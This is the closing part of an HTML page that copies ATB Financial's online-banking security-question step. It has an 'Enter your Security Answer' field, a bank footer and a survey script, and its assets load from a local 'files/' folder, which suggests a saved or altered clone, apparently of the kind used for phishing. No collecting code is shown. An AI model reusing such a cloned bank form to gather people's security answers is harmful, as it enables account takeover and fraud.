                </select>      <span style="visibility:hidden" class="VAMErrorText" id="ctlWorkflow_vldUserIDReq"><img id="ctlWorkflow_vldUserIDReq_Img" src="files/error.gif" alt="" style="border-width:0px;vertical-align:middle;">&nbsp;<span id="ctlWorkflow_vldUserIDReq_Txt">Please enter your username.</span></span>
                    </div>
                    
      
                    <div>
                        <span class="form-label display-block mb-5">Answer:</span>

                        <input required="" name="answer5" required="" id="ctlWorkflow_txtUserID" class="form-control full-width" placeholder="Enter your Security Answer" type="text">
                        <span style="visibility:hidden" class="VAMErrorText" id="ctlWorkflow_vldUserIDReq"><img id="ctlWorkflow_vldUserIDReq_Img" src="files/error.gif" alt="" style="border-width:0px;vertical-align:middle;">&nbsp;<span id="ctlWorkflow_vldUserIDReq_Txt">Please enter your username.</span></span>
                    </div>
					

                    
                </td>
	</tr>
</tbody></table>
                    <div class="mt-30 clearfix">
                        <div class="col-xs-5 pl-0 pr-10">
                            <input onclick="__doPostBack('ctlWorkflow$btnStep1Cancel','')" name="ctlWorkflow$btnStep1Cancel" id="ctlWorkflow_btnStep1Cancel" class="btn btn-plain full-width" value="Back" type="button">
                        </div>

                        <div class="col-xs-6 pl-10 pr-0">
                            <input name="ctlWorkflow$btnContinue" value="Continue" id="ctlWorkflow_btnContinue" class="btn btn-primary full-width" type="submit">
                        </div>
                    </div>

                    
                </td>
	</tr>
</tbody></table>                   
                                    </div>
                                </div>
                                
								<div class="col-xs-4">
                                    <div id="loginAd" class="ad-responsive" data-mxad-default-url="http://www.atb.com/learn/resources/Pages/ApplePay.aspx?utm_source=atbol&amp;utm_medium=login&amp;utm_campaign=CP-2016-ApplePay" data-mxad-default-image-url="/ATB/Images/login_banner.jpg" data-mxad-user-id="banner1"><a href="https://analytics.moneydesktop.com/offers/OFR-8df683bf-fcfd-4f32-34c6-d4787c46e07b/redirect" target="_blank"><img src="files/CMP-f6e6bc42-c985-05e6-b3a4-277f546a5f0b.jpg"></a></div>
                                </div>
                            </div>
                            <div class="row mt-50">
                                <div class="col-xs-12 text-xxsmall text-center">
                                    
      For assistance, please call the ATB Customer Care Centre 7am-11pm, 7 days a week at 1-866-282-4932.<br>
      © ATB Financial 2018 &nbsp;|&nbsp; <a href="http://www.atb.com/" class="text-link text-underline" target="_blank">atb.com</a> &nbsp;|&nbsp; <a href="https://www.atb.com/contact-us/Pages/default.aspx" class="text-link text-underline" target="_blank">Contact us</a> &nbsp;|&nbsp; <a href="http://www.atb.com/SiteCollectionDocuments/ImportantInformation/Personal_Online_Terms_and_Conditions.pdf" class="text-link text-underline" target="_blank">Terms</a><br>
      All Rights Reserved. "Trade mark of Alberta Treasury Branches"<br>
      Authorized access only. Usage may be monitored.
    
                                </div>
                            </div>
                        </div>


                        

                    

</form>
                </div>
            </div>
        </div>
    </div>

    



<script type="text/javascript" id="">(function(){var g=function(d,h,f,g){this.get=function(a){a+="\x3d";for(var b=document.cookie.split(";"),c=0,d=b.length;c<d;c++){for(var e=b[c];" "==e.charAt(0);)e=e.substring(1,e.length);if(0==e.indexOf(a))return e.substring(a.length,e.length)}return null};this.set=function(a,b){var c=new Date;c.setTime(c.getTime()+6048E5);c="; expires\x3d"+c.toGMTString();document.cookie=a+"\x3d"+b+c+"; path\x3d/; "};this.check=function(){var a=this.get(f);if(a)a=a.split(":");else if(100!=d)"v"==h&&(d=Math.random()>=
d/100?0:100),a=[h,d,0],this.set(f,a.join(":"));else return!0;var b=a[1];if(100==b)return!0;switch(a[0]){case "v":return!1;case "r":return b=a[2]%Math.floor(100/b),a[2]++,this.set(f,a.join(":")),!b}return!0};this.go=function(){if(this.check()){var a=document.createElement("script");a.type="text/javascript";a.src=g+"\x26t\x3d"+(new Date).getTime();document.body&&document.body.appendChild(a)}};this.start=function(){var a=this;window.addEventListener?window.addEventListener("load",function(){a.go()},
!1):window.attachEvent&&window.attachEvent("onload",function(){a.go()})}};try{(new g(100,"r","QSI_S_ZN_0xidHQNpghfJsWN","//zn0xidhqnpghfjswn-atbfeedback.siteintercept.qualtrics.com/WRSiteInterceptEngine/?Q_ZID\x3dZN_0xidHQNpghfJsWN\x26Q_LOC\x3d"+encodeURIComponent(window.location.href))).start()}catch(d){}})();</script><div id="ZN_0xidHQNpghfJsWN"></div>
<script type="text/javascript" src="files/banner1.js"></script><script type="text/javascript" src="files/a"></script></body></html>